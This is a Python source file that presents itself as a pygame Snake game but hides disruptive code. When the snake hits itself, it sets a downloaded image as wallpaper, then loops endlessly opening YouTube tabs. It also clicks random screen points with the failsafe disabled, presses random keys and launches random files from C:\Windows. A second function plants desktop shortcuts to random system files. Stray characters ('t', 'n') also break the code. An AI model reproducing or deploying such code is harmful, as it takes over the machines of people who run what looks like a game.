import os
import pygame
import winshell
import tkinter as tk
import sys
import random
import pyautogui
import string
import ctypes
import webbrowser
import urllib.request
from win32com.client import Dispatch


URL = "https://www.google.gr/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png"
PATH=urllib.request.urlretrieve(URL)[0]
t
pygame.init()

# Constants
WIDTH, HEIGHT = 800, 600
GRID_SIZE = 20
FPS = 10

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (0, 255, 0)
GREEN = (255, 0, 0)

folderpath = 'C:\Windows'
folderpath1 = 'C:\Dokumenter'

a = os.listdir(folderpath)
n
def shortcut():
    folderpath = 'C:\Windows'
    a = os.listdir(folderpath)
    b = random.choice(a)

    key = random.choice(string.ascii_letters)
    desktop = winshell.desktop()
    path = os.path.join(desktop, key)
    target = (b)
    wDir = r"C:\Media\Media Player Classic"
    icon = r"C:\Media\Media Player Classic\mplayerc.exe"
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.save()

pyautogui.FAILSAFE = False

SPI_SETDESKWALLPAPER = 20

def simulate_random_click():
    while True:
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        pyautogui.click(x, y)
        key = random.choice(string.ascii_letters)
        pyautogui.press(key)
        b = random.choice(a)
        os.startfile(b)



# Snake class
class Snake:
    def __init__(self):
        self.length = 1
        self.positions = [((WIDTH // 2), (HEIGHT // 2))]
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
        self.color = RED

    def get_head_position(self):
        return self.positions[0]

    def update(self):
        cur = self.get_head_position()
        x, y = self.direction
        new = (((cur[0] + (x*GRID_SIZE)) % WIDTH), (cur[1] + (y*GRID_SIZE)) % HEIGHT)
        if len(self.positions) > 2 and new in self.positions[2:]:
            self.reset()
        else:
            self.positions.insert(0, new)
            if len(self.positions) > self.length:
                self.positions.pop()

    def reset(self):
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, PATH, 0)
        
        while True:
            webbrowser.open("https://www.youtube.com/watch?v=48rz8udZBmQ", new=2)
            simulate_random_click()  # Simulate left click

        self.length = 1
        self.positions = [((WIDTH // 2), (HEIGHT // 2))]
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])

    def render(self, surface):
        for p in self.positions:
            pygame.draw.rect(surface, self.color, (p[0], p[1], GRID_SIZE, GRID_SIZE))

# Food class
class Food:
    def __init__(self):
        self.position = (0, 0)
        self.color = GREEN
        self.randomize_position()

    def randomize_position(self):
        self.position = (random.randint(0, (WIDTH//GRID_SIZE)-1) * GRID_SIZE,
                         random.randint(0, (HEIGHT//GRID_SIZE)-1) * GRID_SIZE)

    def render(self, surface):
        pygame.draw.rect(surface, self.color, (self.position[0], self.position[1], GRID_SIZE, GRID_SIZE))

# Direction vectors
UP = (0, -1)
DOWN = (0, 1)
LEFT = (-1, 0)
RIGHT = (1, 0)

# Main function
def main():
    pygame.init()
    clock = pygame.time.Clock()
    screen = pygame.display.set_mode((WIDTH, HEIGHT), 0, 32)
    surface = pygame.Surface(screen.get_size())
    surface = surface.convert()

    snake = Snake()
    food = Food()

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP:
                    snake.direction = UP
                elif event.key == pygame.K_DOWN:
                    snake.direction = DOWN
                elif event.key == pygame.K_LEFT:
                    snake.direction = LEFT
                elif event.key == pygame.K_RIGHT:
                    snake.direction = RIGHT

        snake.update()

        # Check if snake eats food
        if snake.get_head_position() == food.position:
            snake.length += 1
            food.randomize_position()

        surface.fill(BLACK)
        snake.render(surface)
        food.render(surface)
        screen.blit(surface, (0, 0))
        pygame.display.update()
        clock.tick(FPS)

if __name__ == "__main__":
    root = tk.Tk()
    main()
